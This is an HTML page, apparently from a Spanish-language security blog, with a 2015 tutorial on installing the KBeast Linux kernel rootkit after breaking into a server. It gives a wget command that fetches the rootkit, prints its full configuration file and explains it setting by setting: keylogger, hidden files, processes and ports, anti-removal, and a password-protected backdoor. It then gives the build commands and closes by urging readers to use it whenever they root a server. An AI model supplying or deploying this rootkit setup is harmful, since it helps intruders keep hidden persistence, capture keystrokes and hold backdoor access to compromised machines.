@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>[KBEAST] Plantando Un Rootkit - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="Siempre es conveniente asegurarse el silencio luego de una intrusión, y con que me refiero al silencio? Ademas de entrar en el tema de borrado de &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/13/kbeast-plantando-un-rootkit/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">[KBEAST] Plantando Un Rootkit</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T11:25:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:25 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-WCfelBHKlks/VLVw6g-uuzI/AAAAAAAAAHg/ILNAs-uNwHk/s1600/5342ec9a23570dcd0a000043-full-rootkit.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-WCfelBHKlks/VLVw6g-uuzI/AAAAAAAAAHg/ILNAs-uNwHk/s640/5342ec9a23570dcd0a000043-full-rootkit.jpg" /></a></div><br />Siempre es conveniente asegurarse el silencio luego de una intrusión, y con que me refiero al silencio? Ademas de entrar en el tema de borrado de huellas, me refiero a la accion de dejar un secuas en el servidor que se encargue de ocultar ciertos procesos, archivos, etc que dejemos en el target para esto voy a utilizar a KBeast que es un rootkit 2011, ademas de uno de mis preferidos, tiene soporte para los kernel 2.6.18 y 2.6.32,y presenta varias funcionalidades interesantes como:<br /><br /><ul><li>Ocultar archivos y directorios&nbsp;</li><li>Ocultar procesos de (ps, pstree, top, lsof)&nbsp;</li><li>Ocultar puertos locales abiertos (backdoors)&nbsp;</li><li>Viene con un modulo keylogger incorporado para capturar las pulsaciones.&nbsp;</li><li>Anti-kill para procesos&nbsp;</li><li>Anti-remove para archivos&nbsp;</li><li>Trae un backdoor bind incorporado&nbsp;</li><li>Tambien se encarga de esconder ciertos modulos cargando en el kernel ademas de un anti-remove para estos.&nbsp; </li></ul>Bastante completita la basura!, demas esta decir que requerimos de privilegios de usuario root, en este caso lo voy a realizar en un debian con un kernel 2.6.32 (entorno controlado)  Descargamos el rootkit.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ wget http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz  ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/GZ4hh.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/GZ4hh.png" /></a></div><br />Una vez extraido nos encontramos con varios files, tendremos que editar a nuestro antojo el archivo de configuracion config.h <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ /* Kernel Beast Ver #1.0 - Configuration File Copyright Ph03n1X of IPSECS (c) 2011 Get more research of ours http://ipsecs.com */   /*Don't change this line*/ #define TRUE 1 #define FALSE 0   /* Enable keylog probably makes the system unstable But worth to be tried */ #define _KEYLOG_ TRUE   /*Define your module & network daemon name*/ #define KBEAST "kbeast"   /* All files, dirs, process will be hidden Protected from deletion & being killed */ #define _H4X0R_ "_h4x_"   /* Directory where your rootkit will be saved You have to use _H4X0R_ in your directory name No slash (/) at the end */ #define _H4X_PATH_ "/usr/_h4x_"   /* File to save key logged data */ #define _LOGFILE_ "acctlog"   /* This port will be hidded from netstat */ #define _HIDE_PORT_ 13377   /* Password for remote access */ #define _RPASSWORD_ "h4x3d" #define _MAGIC_NAME_ "bin" /* Magic signal & pid for local escalation */ #define _MAGIC_SIG_ 37 //kill signal #define _MAGIC_PID_ 31337 //kill this pid ]]></script> <br />Prosigo a explicar la funcion de cada linea en el fichero de configuracion.<br /><br />1- La primera linea la dejamos tal cual esta<br />2- La segunda se encarga de activar el modulo keylogger del rootkit en caso contrario escribimos  <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _KEYLOG_ FALSE ]]></script> 3- Se encarga de darle el nombre al daemon rootkit <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define KBEAST "q3rv0" ]]></script> 4 – En esta linea vamos a incluir los ficheros y directorios que queremos que sean protegidos por el anti-remove. <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _H4X0R_ "/home/q3rv0/protect/q3rv0.txt" ]]></script> 5- Define el directorio donde se guardara KBeast <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _H4X_PATH_ "/usr/share/kbeast" ]]></script> 6 – Aca especificamos el nombre del fichero de log donde van a ir a parar las pulsasiones capturadas por el keylogger <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _LOGFILE_ "acctlog" ]]></script> 7- El puerto que estara hide a la vista de los comandos anteriormente mencionados. <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _HIDE_PORT_ 6666 ]]></script> 8- Incluimos el password para el acceso con el backdoor. <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #define _RPASSWORD_ "q3rv0" #define _MAGIC_NAME_ "bin" ]]></script> Habiendo terminado de configurar el ficherito, que bastante intuitivo es, si me saltee la 9, pero esa la dejo tal cual esta.  Procedemos a lanzar el rootkit de la siguiente manera.  En los kernel 2.6.18 <br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ ./setup buil 0 ]]></script> En los 2.6.32 como es mi caso<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ ./setup build ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/hw6x4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/hw6x4.png" /></a></div><br />Vemos que se compilo exitosamente en el nucleo sin ningun error, ahora vamos a comprobar si cumple con nuestras espectativas.<br /><br /><ul><li>Verificando la proteccion anti-remove de ficheros&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/500HR.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/500HR.png" /></a></div><br /><ul><li>Directorio donde se guarda el rootkit en el systema&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/VSJz7.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/VSJz7.png" /></a></div><br /><ul><li>Pulsaciones capturadas por el modulo keylogger… El fichero de log se guarda en el directorio donde le indicamos que se guarde el rootkit.&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/GPSES.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/GPSES.png" /></a></div><br /><ul><li>Port 6666 Hide&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/xjczD.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/xjczD.png" /></a></div><br /><ul><li>Accediendo al sistema a travez del backdoor en el puerto 6666&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/ygqhy.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/ygqhy.png" /></a></div><br /><ul><li>oka, para remover el rootkit del kernel solo basta realizar un:&nbsp;</li></ul>&nbsp;<script class="brush: bash" type="syntaxhighlighter"><![CDATA[ ./setup clean ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/FwpY9.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/FwpY9.png" /></a></div><br />Espero que lo hayan disfrutado y cada vez que rooteen un server acuerdense de kbeast :)  Saludos!</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T11:25:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:25 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/13/kbeast-plantando-un-rootkit/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/13/kbeast-plantando-un-rootkit/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/13/remote-code-execution/" title="Previous Post: Remote Code Execution">&laquo; Remote Code Execution</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/13/windows-os-evadiendo-las/" title="Next Post: [Windows OS] Evadiendo Disable_functions COM()">[Windows OS] Evadiendo Disable_functions COM() &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
